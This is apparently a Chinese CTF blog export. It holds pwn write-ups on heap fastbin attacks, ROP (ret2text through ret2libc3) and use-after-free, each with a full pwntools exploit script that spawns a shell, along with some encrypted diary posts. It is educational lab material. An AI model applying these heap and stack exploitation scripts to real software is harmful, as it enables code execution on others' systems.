{"pages":[{"title":"","text":"ME​ [+] BUPT [+] y1secoa@gmail.com 曾经的博客：https://blog.csdn.net/qq_45834505 ​ 我以后再也没看到蓝色玫瑰，但知道它在那里就够了。有时夜深人静，我就将水晶花瓶移到 窗前，然后背对着它站着，这时我往往能闻到飘渺的花香，就知道它肯定已经在那里了，心灵的 眼睛能看清它的每一个细节。我用心来抚摸着它的每一个花瓣，看它在来自窗外的夜风中微微摇 曳……它是一朵我只能用心来看的花。不过，我还是有希望在此生再用自己的眼睛看到一次蓝色 玫瑰，据丁仪说，从量子力学的角度来讲，人的死亡过程就是由一个强观察者变为弱观察者再变 为非观察者的过程，当我变成弱观察者时，玫瑰的概率云向毁灭态的坍缩速度就会慢一些，我就 有希望看到它。当我走到人生的尽头，当我在弥留之际最后一次睁开眼睛，那时我所有的知性和 记忆都消失在过去的深渊中，又回到童年纯真的感觉和梦幻之中，那就是量子玫瑰向我微笑的时 候。 ​ ——《三体》","link":"/about/index.html"}],"posts":[{"title":"0ctf2017-babyheap","text":"fastbin attack 0x01 程序分析例行检查，64位程序，保护全开 ida查看main函数，菜单题 sub_D48：对应Allocate申请内存地址用来存放结构体，申请内存用的是calloc sub_E7F：对应编辑edit，这里没有检查size ，存在堆溢出 sub_F50:对应delete，free后指针清零不存在UAF sub_1051就是puts打印 0x02 思路利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写 0x03 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *# p = process(&quot;./0ctf_2017_babyheap&quot;)p=remote(&quot;node4.buuoj.cn&quot;,26060)context.log_level = 'debug'def allo(size): p.recvuntil(&quot;Command: &quot;) p.sendline(str(1)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def fill(idx,size,content): p.recvuntil(&quot;Command: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) p.recvuntil(&quot;Content: &quot;) p.sendline(content)def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))allo(0x10)#0allo(0x10)#1allo(0x10)#2allo(0x10)#3allo(0x80)#4free(1)free(2)payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)payload += p8(0x80)fill(0,len(payload),payload)payload = p64(0)*3 + p64(0x21)fill(3,len(payload),payload)allo(0x10)#1 The original position of 2allo(0x10)#2 4 Simultaneous pointingpayload = p64(0)*3 + p64(0x91)fill(3,len(payload),payload)allo(0x80)free(4)dump(2)content = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')print(hex(content))libc_base = (content) - 0x3c4b78print(hex(libc_base))allo(0x60)free(4)payload = p64(libc_base + 0x3C4AED)fill(2,len(payload),payload)allo(0x60)allo(0x60)# gdb.attach(p)# pause()payload = 'a'*(0x8+0x2+0x8+1)payload += p64(libc_base+0x4526a)fill(6,len(payload),payload)allo(79)# gdb.attach(p)p.interactive() 0x04 参考文章https://blog.csdn.net/qq_43935969/article/details/115877748 https://www.cnblogs.com/Rookle/p/12901747.html","link":"/2022/01/14/0ctf_2017_babyheap/"},{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"基本ROP ret2text首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了NX保护，即不可在栈上执行代码。 使用IDA查看源码，可以看到这里有一个危险的gets函数 以及这里有一个system函数 所以如果能直接返回到0x804863A，即可执行该函数。 在GDB中对main函数里的gets函数下断点。 可以看到，存储局部变量 s(eax) 位于esp中存储 查看esp和ebp得知 s的地址为0xffffcecc ebp地址为0xffffcf38 两者距离108个字节 所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。) python脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 ret2shellcode先检查程序的保护机制 全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。 通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。 buf是一块位于bss段的可读可写可执行段。所以泄露思路为: 将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。 在gets函数处下断点 得知s地址为0xffffcecc，ebp地址为0xffffcf38 ebp+4即为函数返回地址。 所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。 写python脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() ret2syscall先检查开启了哪些防护措施 开启了NX保护，所以无法在栈上直接执行代码。 使用IDA查看，仍然是gets函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh 接下来要了解payload这样构成的原因，需要知道这三个指令 在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。 所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。 写出python脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc1给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了NX 检查是否存在/bin/sh 在IDA中查找system函数 查看到ptl处的system函数 写Python脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() ret2libc2这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数 直接给出python的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload ret2libc3 检查安全保护，只开启了NX IDA里查看，仍然是gets函数的堆栈溢出。 但是这里没有给system函数 也没有给定的/bin/sh 所以需要我们从libc中调用system函数 根据这个知识点 写exp,涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"To kk","text":"a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53704f686bd661b3be8c7a2c43f4af3529538c4153b572e711ee1f2ce0217686708711bb3fea2deada3982089c6833593893cd51b4b88742924ef01aaacdb0fb5d2c75cace0713e615cae48331d4a1a47ec0081c6de2b4e1921fee686690e17a46abb6d5adde65fa21d0d2c36f066c29d0742cc1c2e03065d46fffd0339bcfe98bee42e123309c8c5a1bafdd1d2afbaf27f24cf7b265f0a48ba21a73986fd547205fee678555f0418a3e8b13612aeb9a558ff060a6846f74572e9fece580ea4787038abd6199eb609ccb6ab52c46bc928346e2e4387b84038ad88a7e7eb3c7e0abcf9590627c22df64a62f8fcc085c34f7c80cacbce53331ad33c8fbc08a8bf4fd75c0e02029e1b41ea799d9bc973590cd04b3d0879c6cb8d5c0e7a82b206fdd2bc2f69d91026065a5e9ecdc3d6a055996bc7a57899fb7063da7ec21906825e13064fc2f07368ed6696bc8074a1f2d07dd6ae2a2380880cbc96edb37fde089388a5b424f99ec10facf526311998a0f6525b02e4e003f5b6ce9912a14a4eaf66c77717c02e382edf3137a6aaf5afdfcdc9e42d074996f1d61c3b65c574a6c96b2256387ccacd237c16cc38a0cc150cdba7df33ff81424671dceb4968712412f409c4b8709f5f47be0c5d19296b4b36e2dbb9da02579b81eb7847e76e288e2b42a9010185bb15b1e4cbc773592fc31db3f3edeb3db16588558b49f1c857f0d42a2b02f582fc1ab2a66f455d2d4bc2f382df082c2818a81933c62786b3a65420b2fa43424db868a7992ec09fb439a5fd1b7ab44c278b48d8f4386dba71e0e0bf6bafdb804f5e190d8a147b094aee9eb460429d18df175cfd3edec4dcc51d1cbc562e2b1ff879866363f25b8e1b992eb66df62c10fb6eb64b33cf63a0bca450b1153f919a2d19bf8a798bbcebf94fd67f7cc2b083d778a2233dcf1769c40d881e6441e921c1107b192738a1498dddedef7a315b457e8906235d23e3fd89d239aee20f8f061f2b174dbd02e31ff3e090ea9896b0e3ff2302b535e74b1119099f0c52d7a60c6da30a1f959001a9d1cbec5ef5b51b1b6c3b303070ba3351ec179507479b87040445dda00195994497b0b62272cac0b4caceb371a1c18164f6db1c7bcc249bb8816b35377671d15a641c8a5230d8a7a212d494b11ded39816b38f30e6264815c5a03970867597fb2950d0f0c4d97d95c72c0cdcda64ac8d3099d5d80f7a0ef7af52d32198db256ad6947b9788dba5274baea5b0f9eb96e4edcca63b1d8b0864fa075130f7f8b988b35b3059b7841f0441ba12e96a2ee233ac1dc8fe77c512601c46e6aa47051f7e3c350fcd46d49a5780048c289ca0a8166945ffd28f749caf2b0d6c222f42e0a61d9444a275c90a144b468c7df8453d3ddb43d7bde971ad9d8d44d7d61194f478a099fa79455a6d9dcd354f243b4c1ee3229b6a3e80c150356bdee7b8f576227c7b00307e16d72ab9c6c1ca1642d8edc839f0227c583d70829378a42de0f0f4938a552878899561d946c834dec641e2e380c64f01d5da898aebf31d0ecba0944b934659605926f66cc506f2060819f1e2c3a0079026e77301084d1c4572f6d6249dfd6eb83efc90bdc09fa5575032bdf434b87e7863bc12dc0358068fd5abedac684b2d4db9e8f28e3f5e858e698e04388499101f6eeab96ef62f95a2e48c60e0c5f07043059b3b0c595f91242a3bacb650bf5ea384dd19a6272d6e811e92146bd29723e20987be93aaefecdc2543afb673578dd969c120932f5768d14ebb8105cc2a977039ec5cdfcd573a182d7e25e8707a58566e2de175301e4de60e77039c82457cc3a57c973ae7098babb023d8638b0ec81a78aa925b82280824f5a48afec35b5a87ecd91c1645ef7eba5056bf64774cc255b5e55632f95314e6ee549c5b0f69f65f04492a47f110dbfcb7c7e03e8abb255367b9b0964bb333732292e0ad92880194e7a5271f6a1833611137453ae5e08c2366fccdf731a72c494a430e59eb02375877538381f9381dcb229d2f98c994278dc8c4dd210e1035db105f965de586ebb3646f064d3d47c354ef0f005fe85678f92dd1404a4c881ef8308eb0216da32c7239434ff6b6f230377b2a20a7d014a8b0a2dbd35c1292356e624ea93f213ab0a245bcc89c5123fba71f32f32ae4406005a720d62190a342debd5b065ee26c98875ad59a9edca578102dbbb4d0b94c241574f6d34d432e588c3275ef5069e093f8253c3e85d9b3ba7b1a1e98b6024e1570a407e0c0f59b90f89efeab6333295fc000eb8683ad7f2749f51f14467953e32199eac5438868ecad43c90ebf6950258d3fa87d8170ee763322484800966abbe3215e0c65e250d9083314b352804afc1e55c94cf602a64bd4e6026cd0deb595396eeba327f2dd999d54389c979c81c936fc026226b96e734191a755bf66e34c13dea5113d89630d45fadf7326162604d4ce8e6d8a5c2589dfa919318ac37ec298913ac95f1a7061c74a2233f98249d687a3ee6d0848131044c23ebcba30bf34b77d7a32378125d736c56a80d0c273c84faac71a4c4355617c3d991f50de3d54f0ae1cad27b6693d14f11b9906f74c7de738c6fe20d529a13471ccb3274f3d9168fa9c984630db20b631b0404b7b08ce9fd20206a38f313b499846ea436818e59afad01ec9 Pease input your password","link":"/2022/01/02/To%20kk/"},{"title":"Diaries","text":"b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02b9e5597b8013830aeb659dc6944f615e50212eca39800024b8915041b82abcbb1f909949a21ee7f948380a304a6a59254655a595662ef8de7c696c909b711d997e9eb675e8bea7c522698a91b595b6de3b69dcbba419572cc25b2185a4a82cce8bd2f6db3f7409fc95b7c5a9b3ba1ac7116919da19415da61d6b781aa18086d93dfeed04c4f81b9a2e2ee533e9db825675e10d1531160f7b3158e2e79b3c56ea069083c7c572d4e9e90fbbbd6b6755f7a70e691765c6234e8b30663740995bd9a157bdfd0047e76514ac4f89c7f453194a05a814b282265c9302fc51857f995e4010fae468aedf59cf8d02a50a16638422d7b29eb2774e6b44d3786131dd08f80185b89115c8f44850a75ce5852bcedad8957a1b0793c7e6339de5ee40130b024c91b4ce5b68fde1b79cb8130e8d1546c390bb72ab668236d7007c08912f687c1994a241a60dfa7e5c0c5477559644feb390cef5eb0fb5383caf8b13993502d3d9ce2380d2e346822ff931a3375e72cd568571c387f9762a664ea90900627b038861a1383ed19a29901ad10ae05429ba1e3627bb7ce1d0c993888c4bfb3d12c4bc4d91d3d2da3497f01319094c52d7e17036e025eaf1732e5ba714264ad7454291112b70483a4ba9aaecbc3a47da7d0be3b1f9fd0d18ada0122056aa443c24bf1a5a73d4a23b65a12e607e794c52b775aefb9b6210860e724999715a479b1fb524287d60ef43c1db037f5540d5db1e5fcadeee3ce77964efc9a24cdaf6281eb0004f1db42d5012582719bc20bd20e3a3119cda0e445ff9aa3497882ec0b54d10fdbba87ceb18e9121cde5e0204d21f22b4182bded3784849045161f045a7d3e29d9725e255c8aef501bfca97e461340ae17e09b9a72e3a52701486034861ce509e0d60028276f3b9efbcb9d9cd7872a0f4a6dd320123df8e71bef1436b01bdb843df2f21bc550b2ed8f1109bba2f13c0ee1072f984bf26d3976b1b26fe64801b3355e70a87059b0ee8facd989bcacd7c5fb83e4c88de349dfb664a058440f79e4fab1391efcdcc6312652d7ef3564bcbfd5120eeadbe25d5d35b33167464b2b13a7e9710cfd2d5e5855e37757ab2f664baec6268095abc67e22959e427479dc2c211fb65fc272afa03f0322759dfe52473ae9e6f869d015d1c029ab6fb3173e7b8cac34208c99ef4d3f51031bd48824cfda64bb4ef3d609c4cff7b8188fb69d505483f333e294ff22d532b587daa82e1e459b856cec1c29c8e138f1513993b3905406a5a6294141b755d401b97800f9ed9f0d965c382c900f5781308caf782bb3fca3b656e35e9b8640a9f2e333d25fa705d80cc95eb08cf15f557a5ba057d9a792ba3fb5f0408c273a56363dce042808398ec243da0020f293b2fedcdbcbd31a3f10b5a07d49e049e2eaa043a4232ab1fb86b19784cba2cb9f6d43a3ffd4b9ac58ede0aba3739885cb991f18719daed98bf240e2fa7a8e4406202a933842ab015de8b56c08aea1fe2f3bb8bf8be7fed795b6523bf7f68bac9f0bc81c67683a837f82c5eb599d8c0d6ee09dbf452fd4463cf090537a9a27037c5f0885f5621731c9f10617edd82f73cac28bc86a488559f37ea6d309f552c725851ad3a8018f92512e01aa25730c55a5f3e4bd6dc304a1471a8dd5bada58114dc28dc8788a75881f924e60fde96f56a391e04da341e774dc44442cefd4095c87a9d1a7cec92b023a06d70092a1ee0c7e0fa5adcd4f99fb609d7269e70f38a38b77cec17d0f95f35f0ef480d66046cec5779e57ebcc6d8f84170e4f9e904526c77a20cb964298534f97c85e4ea3590fd5f1d9163a01f318b419acd85d99ec2621bbd7d677773dea589d07813afdd2b2c34a7ec3ff61afab3c7f801369b3bf6ec90a1a5e5b2d3e8da02eebd2608052cc33f66ad223189d46c188fdce88038c526e9bb9dcb69c49ceec8d52ce9de4024f3974e85b618f85fba93b7a1b9f1d6a70e8370a7bb58dad93332a95132bc75705c79b532999c80b394626b905369069da7c6b84cf223108c5ed064d4e4eadf932896211de63e59c415d2420b11bfaa9f52a6ca443f75cab784304085b7287578a3e6cac1665e536962e50bb8b60431c0b55a6ed21fc8bd28af8f93809da8f5a9a66afd96e6f4938b853608e7556cda175b016fe84807d9d784432f0892a1adf49cfcc77f5e791bf0e36ddb3d617089232f5b05ae3dfbd3ff588550946b2ea5e68ba6fbeac953909423df405b4ddcd500268c5d375b20f93bd52eda68fed439160a4da74ed6f62642e8c561b794b96e2564945968b1a7407575f17cd000baf39920122d4de6f7db44d1b43adc9bab8ce4fbf76ee062503e2a5ab3f163f37cb14ca663d00b165155036698ccf3ecf0f77982028aed4a325e11944b53616d8bebc454e15bfb268528164eef976ba761e03e86d8f287056c8df5e4c9e97466409bd629c6c39dd853a5ef04b85eae33d8814f639013a23d78b6244eb57da0fe36c35f6c2779ce5e466a8c1162a2ab2bcb564977d8d19c4bdce5e33d6a6b0ccf3fbe81335f32e9204ac5f97c767aed7865d0556148ad555dab0ea2051490def843fbb82b8d7515016b706e528849a104dc8b5d36bcf54fc1a9dbbbaa85542fd218aa7cbfeb87587d0a9070ccc4c37a87bf6d749ebf2ad4fd7b0323f01e950d7a580877c4c1d58caaf938793a8fbff61dda15ae1a74fd3029845f6a4d7bef781452b981334ecaa509fbe48b2d39a37d1bd57b6d4cf76b7d448fb3549304469317d6d8fe0a0f7c919ca523c8308bb6c4a7d90ef8a18a7ab840aee67ed820da26e59fc9f9dcc5b2a9b92c9bb211a87e2495fc881daeb9100f94c6ce4f255df2d91011aab3b000d74819ed1cd001e9fe1561751c2ccf66e7f98a3f1af11f701870c452d519bad326738f27926f0066a75265555da34051af8270b78343c4b2b2d663b7fcdcf607e9d456daf0ea703e6a81cd6db12a070dae69c18892be87968b0106796c93873cb89aa2e7159eae36f01a19993735f8c12a37fc9036ba3a1c0ab692f34cf1e01bc51fece58ac0fa2a1b1d7f5a8689060f9ee2cf52606c7a0425ba49b32c58e56ae993527e56dca6c3e2a613dd92127974bc3834b4db8ccbed1534105c4cc616dc0e51060183fb41c84acdb0840fb7282e6eca62eef6cdab52d5d5596f0f86bb68dc1c05e0c4f5fc0bcbb73062732eddd21dbc6f0761348410486edeb8e674d88aaeaf3e101067bd42b566f428b542faf424a6e94de15f811b1b0c6c210ae2c08f3ffa21ed084333a3042647c05a9b35018ab6a478eb81794c6573c7db6be3f366e96830567f2bd30f1e2a99019226f2d73b3f18bb069cbee268e2af65f3a1d3ecce08369a77a9057216c25d716748d433fdd2ade782613539684de433df7f04a62c473de759c17c617f3cdf3e71536d5d6c329ece3b7ade8d67cbf93296a31714d439eedf53e5b8ed8a8ededc27ebbd16186b9b28be539508f227525353b10ce4c958ae3d19619a8dee7564f07a84394a14c003734748637a9c5e0bb2c7201ab2fc436546321742494c5e863b74edc4d8dc0d7d5463324729353d9cc3cf9955ee0eddd4d5cac3f7a0149c9165e9c6ff344c1d4675b336adf4544b34a17bae2f418dae9a7eb061666612883b6008ea252184d3dece44f1835ee39dc2781ad52e55c88503e8be7fca7f9e15ec4fd5a3a2b73019e3f1923df5792a10becff6c27adc2e33d01d74c142f626de851d344cc596209ab07203a686863014063d1a6904db8b09de55ba6dc48098927c36216c034fc40821a94c892c47a19a669913a871d704540f6fc3ef46f1e3cb7f0fcd2ed3fb76b80178f9e1788b8dc6276bf315e6a19795700e38db9d0a618e43482c7965215e0ceabb498e844d3c35d5f6c288210c8754a4eed3008862325085249b6d1dfb440afc9a2c930eeb7e2cc5fce27ce6c9ced227ba36e5a7ebe8761a71f4837901167eb81bc96d1f4c033c5a40eaf364cf45c62e241a9bff1d0573202661c2481847f7b7de66630fbd166e8c15523c2316920b0825ab26d81f441045d694bb83686657aad45692fba414620e8824dcbdba9b826edb841c9d9a05b29e42f41bc08d0704e345d5f6ea78d67636c7264ae8524d2584a01cf8bb1f708dfdef36c9c936ad3ef91cda36df96e1450d6defb4bfc8715ab593b2be8933c9b82a00c0b7239729f3d6b3682a74b6f7c9313d164ac8dcbbcdb516536267d9941184e12f7759b741de98c75ddf7fa9d7109e2d89a837cb61e178db8e2fd67999ab6810fd2cd58afa72e112c160d837d9546f9d68118048bdadae867d34491c6103ada4056af2adb142bc5a49ee2c0cdaea7b0c209e60d57d12deef2b236332ea3da05ee7caacecacd9c21a1cf4b21c6a0f5f2274ebbecc8015b5309e1f2e70b9820f619f1f9f6f9bdc74af69f5e76f509ee5ad41a3cc220f849214b0f5e88b1a295f21d301e4ee37adbed0d0ff6f53e27ce46e0d14626b0e28db6ceeb6cb736f6d6cdf6f6573c25b494355ca032dedf466a3511eb572f32a19a0de8b29cb53cab815b8626d25ca62b5c2d04a14fd7acda8cca6609a9dfb94d7085bfd96f63c5590eed89082ce05ff13489facce36c7572d4297a63e4b0b1767856d8f7b82d659bdf174340aa8c33ed7c05dfb6ae3c65883024e935e99e23194838c856655571f9bf7a7124c2b947bf7aa01b7d4a56615ee7f63f6a522b8fa73eff6725d8ce7adc62ae741d8cfa41b71b091fc2e8078aeca6544d3eb623ae12600bceb0275cf86fe45247461bf404457deb370dd02038dafc0e504f084707b30893d324e392100afd51637eba9915374acff9af6b877d3e9e35c678ddf5a5f84198dacf5167ebd6fe318d5714323c52e3885514676d59dc01c36e795c0a6721e6dc0cfd016d5b415322715545cd14f92f544886fb72e4fb9d2167bc1ca4dda40039bdaaeb1fb8ccba3aacdfd4248886329009dd3666e9bfb5931289322c58dc8dbad35807a6c7e3debb1332fed6cf0973d95a8f495d991d12d425d8e669632f8c752e0890b7db4f7cc3ef9c5b8c2534dfa8302fb63fc6c9c16268891bd6e2a20104a989a50492c83e8c1479a5a87fd1c31e68b18e2fda6df537185e6dc82d590d9657b439e9d19cec9994fbbe92a37aed974f6c6caeec7c42af4b8031607ae37cfb3bf79bded3de27982f758c1cbdf62027bf44bdc476256fc2641d549051c91b9dd4ff3cefaf876432a58b1f35bbdb3fe69b4f73c2d40e81b7a12f0a8f26c8608a31467e69c5e4c4f18b529c155d8184ea8c6b9a0401b452f973bdc226a51644d614f63485cc9fa0449949bd1e487d8f89fff2b99e1ae3d1a847e5713713fe52745bf47d548dd24c332b7a37d0237aec1e068500f5416bbfb91137fa5f86d52b15417dbdfa25e6f2cfd66b66f5822adaf4315f37eea521bd97e6d0e4b5ea222770adcef9b98abadf6cb17248d98c44e6d32bc95dad0bd3b4f9d766cbd38a4e58cd1244b2368a0a7ce5ce4a13bf49ab86f6b5f4bf17ad00f3d66904dc46da44c7469aeaf28a5a3f33a29cde9d9ff4c578a83ad322d3e67ccff8a92cec2f5260333ab8e3d2fac8f197b0e39c7f51424eb08beb30606a3a29f497e4f68e03670858dfa7b2531a369eb1d43e49821f6a554a791de9bd85dcea6f227bdc4c881e195656269de8727b8b472ca90354ee2b21b3147c20552a626d55d68f74018810d2dd0e239e63f792960d7b764e8f96240b8efdb1077f11f5e8c44335583a97d61bbb78366c720875c4cfcd7ac477caec44ad60d626c4d844bb638da9fce3fc452cbf51849d9a259ebcd0a79569a1c2dc7a5347284b94a3fb4c0882be008f3a24ab126386641b7d31ae6e973228c76aa76b59bf0b91135a8d7ef3b1bd74e9bc913bc2693fe254e53026257022dfae04b231959c8e5631c34cd0276a159780faaaa45da90f04470926c4cbf9ea91f6ccd27f455b8896e12c000062463bb179d8d6babd69c41bc8a9f9d61a8fbc4e51a2f0b2a544bd515de993576f0fee779c21dc583339bf6479f212c7f7e13cfb1aecf11e7814b407a876ef4fc1b82d9a38191849125f82cad312e91f95bacff296fcbd2d2b94dadfdf9af8d9a58fd34b33065e1308c2e114fd2366e71ad3d9212f91a6365a21fe7678b7aa7a202deb792cb0c19717c50ecb41d034dc2fa3bfbf412ec875c65d7e508cf68b5fde0a9f6927c118daf82c6ed56e1da98a40333b9a9b8df340e3e6752d6b Please input your password","link":"/2021/12/26/diary/"},{"title":"堆漏洞uaf","text":"uaf 知识点UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。 例题[BUUCTF]PWN——hitcontraining_uaf checksec检查，开了NX保护，32位 (1) add note add会申请两次内存,第一次申请8个字节,前四个字节指向print_note_content这个函数, 后四个字节指向我们写入的字符串(count会加1) (2) delete note 只释放了堆块里的内容但没有将指针置0，存在uaf漏洞，并未指向NULL (3) print note 调用add申请的第一个8个字节中的前四个字节指向的函数,打印add创建的第二个chunk里的值 （4） shell fastbin是单向链表遵循先进后出原则，申请A,B两个堆块后，先释放A ，后释放B，会在fastbin里形成链,此时，再次申请一个大小为0x8的内存C，并写入shellcode地址，那么第一个8个字节C就指向B，第二个8个字节C指向A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改print_note_content函数为我们想要执行的函数。 在add中，我们只能对content部分进行操作，无法对print_note_content对应的部分即put段进行操作，所以我们要想办法，操作put段 1根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic 申请过程堆块变化：add: free后： 再次申请，写入shell 先进后出原则 wp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./hacknote')# r = remote('node4.buuoj.cn',27609)shell_add = 0x8048945def add(size,content): r.sendlineafter('choice :','1') r.sendlineafter('Note size :',str(size)) r.sendlineafter('Content :',content)def delete(idx): r.sendlineafter('choice :','2') r.sendlineafter('Index :',str(idx))def printf(idx): r.sendlineafter('choice :','3') r.sendlineafter('Index :',str(idx))add(48,'aaaa')add(48,'bbbb')#gdb.attach(r)delete(0)delete(1)add(8,p32(shell_add))printf(0)#第二种思路double free#add(8,'aaaa')#delete(0)#delete(0)#add(40,'aaaa')#add(8,p32(shell_addr))#printf(1)r.interactive() 参考文章https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187 IE漏洞学习笔记（二）：UAF释放后重用 One_gadget和UAF结合利用堆溢出漏洞研究","link":"/2021/11/17/hitcontraining_uaf/"},{"title":"jarvisoj_level6_x64","text":"double free，unlink覆写got表 0x01 程序分析主函数： 之后 sub_400A49：用户初始堆分配 sub_400998：要求输入一个操作选项 sub_400B14：遍历索引打印所有标号和记录内容 sub_400BC2: 要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则malloc一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块： sub_400D87：编辑，是一个realloc，可以泄露堆溢出 堆v2也就是size进行了要求，在最后的sub_40085D函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和system地址。 sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并free掉堆块，存在double free漏洞 unlink思路 利用unsorted bin的fd指针分别泄露出heap地址和libc地址，这样就得到了最初那个0x1820大小的chunk的地址 利用realloc功能来构造unlink条件，结合uaf漏洞，修改某个ptr为ptr - 0x18，这个ptr在0x1820堆块上 利用edit修改atoi@got为system地址 输入/bin/sh拿shell 0x02 漏洞利用添加四个Note，释放note[0]和note[2]，此时note[0]的bk指向note[2]的chunk，note[2]的bk指向main_arena+0x58（两个chunk都进入unsorted 